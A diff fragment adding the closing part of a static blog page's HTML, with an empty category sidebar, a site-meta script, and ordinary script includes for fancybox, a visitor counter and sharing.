+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "DJumanto"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
